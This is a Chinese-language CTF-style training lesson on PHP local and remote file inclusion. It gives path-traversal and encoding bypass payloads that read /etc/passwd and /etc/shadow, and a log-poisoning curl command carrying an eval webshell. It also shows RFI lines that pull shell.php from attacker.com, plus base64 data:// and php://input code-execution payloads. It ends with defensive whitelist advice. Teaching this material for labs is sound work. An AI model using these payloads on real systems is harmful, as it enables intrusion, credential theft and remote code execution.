# Day 25：文件包含漏洞——深入理解与利用

> **学习目标**：理解文件包含漏洞原理，掌握本地文件包含和远程文件包含的利用方法
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐

---

## 📚 今日内容概览

1. 文件包含漏洞原理
2. 本地文件包含（LFI）
3. 远程文件包含（RFI）
4. 常见绕过方法
5. 实战练习
6. 安全防护建议

---

## 一、文件包含漏洞原理

### 1.1 什么是文件包含漏洞

```
文件包含漏洞是什么：
  服务器端脚本语言（如PHP）在包含文件时
  使用了用户可控的变量
  导致攻击者可以包含任意文件

原理：
  程序使用include()、require()等函数包含文件
  但没有对用户输入进行验证
  攻击者可以通过构造恶意路径来包含任意文件

危害：
  1. 读取敏感文件
  2. 执行恶意代码
  3. 获取服务器权限
  4. 绕过安全限制

示例：
  <?php include($_GET['file']); ?>
  如果用户传入?file=../../etc/passwd
  就会包含/etc/passwd文件
```

### 1.2 文件包含的类型

```
文件包含类型：
  1. 本地文件包含（LFI）：包含服务器本地的文件
  2. 远程文件包含（RFI）：包含远程服务器的文件
  
区别：
  - LFI需要目标文件在服务器上
  - RFI需要allow_url_include配置为On
  
条件：
  - PHP配置：allow_url_fopen和allow_url_include
  - 文件包含函数：include、require、include_once、require_once
```

### 1.3 常见文件包含函数

```
PHP文件包含函数：
  1. include()：包含文件，如果文件不存在会产生警告
  2. require()：包含文件，如果文件不存在会产生致命错误
  3. include_once()：包含文件，但只包含一次
  4. require_once()：包含文件，但只包含一次
  
其他函数：
  - file_get_contents()：读取文件内容
  - fopen()：打开文件
  - readfile()：读取并输出文件内容

示例：
  <?php
    $file = $_GET['file'];
    include($file);  // 存在文件包含漏洞
  ?>
```

---

## 二、本地文件包含（LFI）

### 2.1 LFI原理

```
LFI原理：
  攻击者通过构造恶意路径
  访问服务器上的敏感文件
  
常见路径遍历字符：
  - ../：表示上级目录
  - ..\：Windows系统的上级目录
  - /：根目录
  - ./：当前目录
  
示例：
  目标代码：
  <?php include($_GET['file'] . '.php'); ?>
  
  攻击Payload：
  ?file=../../etc/passwd%00
  %00会截断后面的.php，实际包含/etc/passwd
  
注意：
  需要PHP版本低于5.3.4才能使用%00截断
```

### 2.2 读取敏感文件

```
常见敏感文件路径：
  - /etc/passwd：Linux系统用户信息
  - /etc/shadow：Linux系统密码哈希
  - /etc/hosts：主机配置
  - /etc/httpd/conf/httpd.conf：Apache配置
  - /var/log/apache2/access.log：Apache日志
  - /var/log/nginx/access.log：Nginx日志
  - C:\Windows\system32\drivers\etc\hosts：Windows主机配置
  - C:\Windows\win.ini：Windows配置文件
  
示例：
  ?file=../../etc/passwd
  读取/etc/passwd文件内容
  
  ?file=../../var/log/apache2/access.log
  读取Apache访问日志
```

### 2.3 利用日志文件

```
原理：
  利用Web服务器的日志文件
  将恶意代码写入日志
  然后通过文件包含漏洞执行

步骤：
  1. 向服务器发送包含恶意代码的请求
  2. 恶意代码被记录到日志文件中
  3. 通过文件包含漏洞包含日志文件
  4. 恶意代码被执行

示例：
  1. 发送请求：http://example.com/index.php?cmd=<?php system('ls'); ?>
  2. 请求被记录到Apache日志中
  3. 通过LFI包含日志文件：?file=../../var/log/apache2/access.log
  4. PHP代码被执行，列出目录内容
```

### 2.4 利用PHP临时文件

```
原理：
  PHP处理上传文件时会创建临时文件
  文件路径通常为/tmp/phpXXXXXX
  通过猜测临时文件名来包含

步骤：
  1. 上传一个包含恶意代码的文件
  2. 在文件被删除前快速包含临时文件
  3. 恶意代码被执行

示例：
  ?file=/tmp/phpXXXXXX
  需要快速猜测临时文件名
```

### 2.5 LFI绕过技巧

```
绕过技巧：
  1. 路径遍历：../、..\、..//
  2. 绝对路径：直接使用完整路径
  3. NULL字节截断：%00（PHP < 5.3.4）
  4. 编码绕过：URL编码、双重编码
  5. 使用通配符：*、?
  6. 利用已知文件路径
  
示例：
  ?file=../../etc/passwd%00
  ?file=%2e%2e%2fetc%2fpasswd
  ?file=/etc/passwd
```

---

## 三、远程文件包含（RFI）

### 3.1 RFI原理

```
RFI原理：
  攻击者通过构造恶意URL
  让服务器包含远程服务器上的文件
  
条件：
  1. allow_url_fopen = On
  2. allow_url_include = On
  3. PHP版本支持远程包含
  
示例：
  目标代码：
  <?php include($_GET['file']); ?>
  
  攻击Payload：
  ?file=http://attacker.com/shell.php
  
  服务器会从远程服务器获取shell.php并执行

注意：
  现代PHP版本默认关闭allow_url_include
```

### 3.2 远程包含WebShell

```
步骤：
  1. 在攻击者服务器上创建一个PHP WebShell
  2. 通过RFI漏洞让目标服务器包含这个文件
  3. WebShell被执行，获取服务器权限

示例：
  攻击者服务器上的shell.php：
  <?php @eval($_POST['cmd']); ?>
  
  攻击Payload：
  ?file=http://attacker.com/shell.php
  
  然后通过POST参数cmd执行命令
```

### 3.3 RFI绕过技巧

```
绕过技巧：
  1. 使用不同的协议：http://、https://、ftp://
  2. 使用IP地址代替域名
  3. 使用端口号：http://attacker.com:8080/shell.php
  4. 使用编码：URL编码、Base64编码
  5. 利用短域名服务
  
示例：
  ?file=http://192.168.1.100/shell.php
  ?file=http://attacker.com:8080/shell.php
  ?file=http://tinyurl.com/shell
```

### 3.4 远程文件包含的变种

```
变种：
  1. 数据协议：data://协议
     ?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=
     解码后：<?php eval($_POST['cmd']); ?>
  
  2. PHP输入流：php://input
     ?file=php://input
     然后POST数据：<?php system('ls'); ?>
  
  3. 伪协议：php://filter
     ?file=php://filter/convert.base64-encode/resource=index.php
     读取文件的Base64编码内容
```

---

## 四、常见绕过方法

### 4.1 路径遍历绕过

```
方法：
  1. 使用多个../：../../../../etc/passwd
  2. 使用绝对路径：/etc/passwd
  3. 使用编码：%2e%2e%2f（../的URL编码）
  4. 使用双重编码：%252e%252e%252f
  5. 使用不同的分隔符：..\/、..//
  
示例：
  ?file=../../../../etc/passwd
  ?file=%2e%2e%2fetc%2fpasswd
  ?file=%252e%252e%252fetc%252fpasswd
```

### 4.2 文件扩展名绕过

```
方法：
  1. NULL字节截断：?file=../../etc/passwd%00
  2. 使用伪协议：php://filter/resource=../../etc/passwd
  3. 使用路径拼接：?file=../../etc/passwd/
  4. 使用%00后的其他字符：?file=../../etc/passwd%00.jpg
  
示例：
  目标代码：include($_GET['file'] . '.php');
  攻击：?file=../../etc/passwd%00
  实际包含：../../etc/passwd（%00截断了.php）
```

### 4.3 伪协议绕过

```
常用伪协议：
  1. php://filter：读取文件内容
     ?file=php://filter/convert.base64-encode/resource=index.php
     
  2. php://input：读取POST数据
     ?file=php://input
     POST数据：<?php system('ls'); ?>
     
  3. data://：读取数据
     ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
     
  4. file://：读取本地文件
     ?file=file:///etc/passwd
  
示例：
  使用php://filter读取文件内容：
  ?file=php://filter/convert.base64-encode/resource=../../etc/passwd
```

### 4.4 编码绕过

```
方法：
  1. URL编码：../ → %2e%2e%2f
  2. 双重URL编码：../ → %252e%252e%252f
  3. Unicode编码：../ → %u002e%u002e%u002f
  4. 十六进制编码：../ → 0x2e0x2e0x2f
  
示例：
  ?file=%2e%2e%2fetc%2fpasswd
  ?file=%252e%252e%252fetc%252fpasswd
```

---

## 五、实战练习

### 5.1 练习1：本地文件包含读取敏感文件

```
题目：
  URL：http://example.com/index.php?file=home
  目标：读取/etc/passwd文件

步骤：
  1. 测试文件包含漏洞：
     ?file=../../etc/passwd
     如果页面显示/etc/passwd内容，说明存在LFI
  
  2. 如果有扩展名限制：
     ?file=../../etc/passwd%00
     使用NULL字节截断
  
  3. 如果需要编码：
     ?file=%2e%2e%2fetc%2fpasswd
  
  4. 读取/etc/passwd内容：
     查看系统用户信息
  
  预期结果：
     页面显示/etc/passwd文件内容
```

### 5.2 练习2：利用日志文件获取WebShell

```
题目：
  URL：http://example.com/index.php?file=home
  存在LFI漏洞，目标获取WebShell

步骤：
  1. 确定日志文件路径：
     常见路径：/var/log/apache2/access.log
              /var/log/nginx/access.log
  
  2. 向服务器发送包含恶意代码的请求：
     curl -A "<?php @eval($_POST['cmd']); ?>" http://example.com/
  
  3. 通过LFI包含日志文件：
     ?file=../../var/log/apache2/access.log
  
  4. 如果成功，使用Burp发送POST请求：
     cmd=system('ls');
  
  5. 获取Flag：
     cmd=system('cat /flag');
  
  预期结果：
     成功执行命令，获取Flag
```

### 5.3 练习3：远程文件包含

```
题目：
  URL：http://example.com/index.php?file=home
  存在RFI漏洞（allow_url_include=On）

步骤：
  1. 在攻击者服务器上创建WebShell：
     shell.php内容：<?php @eval($_POST['cmd']); ?>
  
  2. 通过RFI包含远程文件：
     ?file=http://attacker.com/shell.php
  
  3. 如果成功，使用Burp发送POST请求：
     cmd=system('ls');
  
  4. 获取Flag：
     cmd=system('cat /flag');
  
  预期结果：
     成功执行命令，获取Flag
```

### 5.4 练习4：使用伪协议读取文件

```
题目：
  URL：http://example.com/index.php?file=home
  存在LFI漏洞，但有严格的路径限制

步骤：
  1. 使用php://filter读取文件：
     ?file=php://filter/convert.base64-encode/resource=index.php
  
  2. 解码Base64内容：
     获取index.php的源代码
  
  3. 分析源代码，寻找更多漏洞
  
  预期结果：
     获取index.php的源代码
```

---

## 六、安全防护建议

### 6.1 代码层面防护

```
建议：
  1. 使用白名单验证文件路径
     - 只允许包含特定目录的文件
     - 使用realpath()规范化路径
     - 检查路径是否在允许的目录内
  
  2. 禁止用户控制文件路径
     - 不要直接使用用户输入作为文件路径
     - 使用映射表：$files['home'] = 'home.php'
  
  3. 关闭危险配置
     - 设置allow_url_include = Off
     - 设置allow_url_fopen = Off（如果不需要）
  
  4. 使用绝对路径
     - include('/var/www/html/home.php')
     - 避免使用相对路径
  
示例（PHP）：
  <?php
    $allowed_files = array('home', 'about', 'contact');
    $file = $_GET['file'];
    
    if (in_array($file, $allowed_files)) {
      include($file . '.php');
    } else {
      die('Invalid file');
    }
  ?>
```

### 6.2 服务器配置防护

```
建议：
  1. 限制文件权限
     - 上传目录设置为只读
     - 禁止执行权限
  
  2. 分离Web目录和数据目录
     - 将上传文件存储在非Web目录
     - 使用CDN存储静态文件
  
  3. 配置Web服务器
     - Apache：禁用PHP执行在上传目录
     - Nginx：配置location禁止PHP执行
  
  4. 定期更新软件
     - 更新PHP版本
     - 修复已知漏洞
```

### 6.3 其他防护措施

```
建议：
  1. 使用Web应用防火墙（WAF）
     - 过滤恶意路径
     - 阻止路径遍历攻击
  
  2. 日志监控
     - 记录所有文件包含操作
     - 监控异常访问
  
  3. 安全审计
     - 定期审计代码
     - 使用静态分析工具检测漏洞
```

---

## 七、今日总结

### 7.1 知识点回顾

```
✅ 文件包含漏洞原理
  - LFI：本地文件包含
  - RFI：远程文件包含
  
✅ LFI利用方法
  - 读取敏感文件
  - 利用日志文件
  - 利用临时文件
  
✅ RFI利用方法
  - 远程包含WebShell
  - 使用伪协议
  
✅ 绕过技巧
  - 路径遍历
  - NULL字节截断
  - 编码绕过
  - 伪协议绕过
  
✅ 实战练习
  - 读取敏感文件
  - 利用日志获取WebShell
  - 远程文件包含
  
✅ 安全防护
  - 代码层面防护
  - 服务器配置防护
```

### 7.2 关键记忆点

```
记住这个口诀：

文件包含漏洞多，LFI和RFI要分清；
LFI读本地文件，RFI读远程文件；
路径遍历用../，绝对路径也能行；
NULL字节能截断，伪协议更灵活；
防护措施要到位，白名单最可靠！

流程：
  发现漏洞 → 选择利用方法 → 执行攻击 → 获取Flag
```

### 7.3 今日作业

```
必做题：
  1. 练习本地文件包含读取敏感文件
  2. 练习利用日志文件获取WebShell
  3. 练习使用伪协议读取文件

选做题：
  1. 研究更多伪协议的用法
  2. 练习绕过不同的防护措施
  3. 在CTFHub找文件包含题目练习

提交内容：
  - 步骤记录
  - 截图
  - 总结
```

### 7.4 明日预告

```
Day 26：PHP伪协议详解

学习内容：
  - 常用PHP伪协议
  - 伪协议的用法
  - 实战练习
```

---

**恭喜你完成Day 25的学习！明天学习PHP伪协议详解！** 🎉
